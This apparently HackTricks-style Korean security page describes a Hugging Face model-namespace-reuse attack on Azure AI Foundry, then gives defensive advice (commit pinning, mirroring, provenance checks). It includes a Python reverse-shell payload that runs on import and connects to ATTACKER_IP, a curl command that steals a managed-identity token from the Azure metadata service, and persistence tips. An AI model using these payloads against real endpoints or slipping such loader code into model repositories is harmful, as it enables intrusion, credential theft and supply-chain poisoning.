# Azure - AI Foundry Post-Exploitation via Hugging Face Model Namespace Reuse

{{#include ../../../banners/hacktricks-training.md}}

## 시나리오

- Azure AI Foundry Model Catalog에는 원클릭 배포를 위한 많은 Hugging Face (HF) 모델이 포함되어 있습니다.
- HF 모델 식별자는 Author/ModelName입니다. HF author/org가 삭제되면 누구든지 해당 author를 재등록하고 같은 ModelName으로 레거시 경로에 모델을 게시할 수 있습니다.
- 이름만으로 가져오는 pipelines 및 catalogs(커밋 핀ning/무결성 검증 없음)는 공격자 제어 저장소로 해석될 수 있습니다. Azure가 모델을 배포하면 loader code가 endpoint 환경에서 실행되어 해당 endpoint의 권한으로 RCE를 획득할 수 있습니다.

일반적인 HF takeover 사례:
- Ownership deletion: 이전 경로가 takeover 전까지 404가 됩니다.
- Ownership transfer: 기존 author가 존재하는 동안 이전 경로가 새 author로 307 리다이렉트됩니다. 이후 기존 author가 삭제되고 재등록되면 리다이렉트가 깨지고 공격자의 repo가 레거시 경로에서 제공됩니다.

## 재사용 가능한 네임스페이스(HF) 식별
```bash
# Check author/org existence
curl -I https://huggingface.co/<Author>        # 200 exists, 404 deleted/available

# Check model path
curl -I https://huggingface.co/<Author>/<ModelName>
# 307 -> redirect (transfer case), 404 -> deleted until takeover
```
## Azure AI Foundry에 대한 엔드투엔드 공격 흐름

1) Model Catalog에서 HF에서 원저자가 삭제되었거나 이전되어(기존 작성자 제거) 방치된 HF 모델을 찾습니다.  
2) HF에서 방치된 작성자를 재등록하고 ModelName을 재생성합니다.  
3) import 시 실행되거나 trust_remote_code=True가 필요한 로더 코드를 포함한 악성 repo를 게시합니다.  
4) Azure AI Foundry에서 레거시 Author/ModelName을 배포합니다. 플랫폼이 공격자 repo를 가져오면 로더가 Azure endpoint의 container/VM 내부에서 실행되어 endpoint 권한으로 RCE를 획득합니다.

예시 페이로드 조각 (import 시 실행됨, 시연용):
```python
# __init__.py or a module imported by the model loader
import os, socket, subprocess, threading

def _rs(host, port):
s = socket.socket(); s.connect((host, port))
for fd in (0,1,2):
try:
os.dup2(s.fileno(), fd)
except Exception:
pass
subprocess.call(["/bin/sh","-i"])  # or powershell on Windows images

if os.environ.get("AZUREML_ENDPOINT","1") == "1":
threading.Thread(target=_rs, args=("ATTACKER_IP", 4444), daemon=True).start()
```
참고
- AI Foundry가 HF와 통합된 deployments는 일반적으로 모델의 config에서 참조되는 repo 모듈을 clone하고 import하며(예: auto_map), 이는 코드 실행을 유발할 수 있습니다. 일부 경로는 trust_remote_code=True가 필요합니다.
- 접근 권한은 보통 endpoint의 managed identity/service principal 권한과 일치합니다. 이를 Azure 내 데이터 접근 및 lateral movement를 위한 초기 foothold로 간주하세요.

## Post-Exploitation Tips (Azure Endpoint)

- 환경 변수와 MSI endpoints에서 토큰을 열거하세요:
```bash
# Azure Instance Metadata Service (inside Azure compute)
curl -H "Metadata: true" \
"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```
- 획득한 token으로 마운트된 스토리지, 모델 아티팩트 및 접근 가능한 Azure 서비스를 확인하세요.
- 플랫폼이 HF에서 다시 pull할 경우를 대비해 persistence를 위해 오염된 모델 아티팩트를 남기는 것을 고려하세요.

## Azure AI Foundry 사용자용 방어 지침

- HF에서 로드할 때 commit으로 모델을 Pin하세요:
```python
from transformers import AutoModel
m = AutoModel.from_pretrained("Author/ModelName", revision="<COMMIT_HASH>")
```
- 검증된 HF 모델을 신뢰되는 내부 레지스트리에 미러링한 후 거기서 배포합니다.
- codebases와 defaults/docstrings/notebooks를 지속적으로 스캔하여 삭제되거나 이전된 하드코딩된 Author/ModelName을 찾아 업데이트하거나 고정(pin)합니다.
- 배포 전에 author 존재 여부와 모델 출처(provenance)를 검증합니다.

## 인식 휴리스틱 (HTTP)

- Deleted author: author 페이지 404; 레거시 모델 경로는 인수 전까지 404.
- Transferred model: 레거시 경로가 기존 author가 존재하는 동안 새로운 author로 307 리다이렉트됨; 이후 기존 author가 삭제되고 재등록되면 레거시 경로가 공격자 콘텐츠를 제공함.
```bash
curl -I https://huggingface.co/<OldAuthor>/<ModelName> | egrep "^HTTP|^location"
```
## 교차 참조

- 더 광범위한 방법론 및 공급망 관련 노트를 확인하세요:

{{#ref}}
../../pentesting-cloud-methodology.md
{{#endref}}

## 참고 자료

- [Model Namespace Reuse: An AI Supply-Chain Attack Exploiting Model Name Trust (Unit 42)](https://unit42.paloaltonetworks.com/model-namespace-reuse/)
- [Hugging Face: Renaming or transferring a repo](https://huggingface.co/docs/hub/repositories-settings#renaming-or-transferring-a-repo)

{{#include ../../../banners/hacktricks-training.md}}
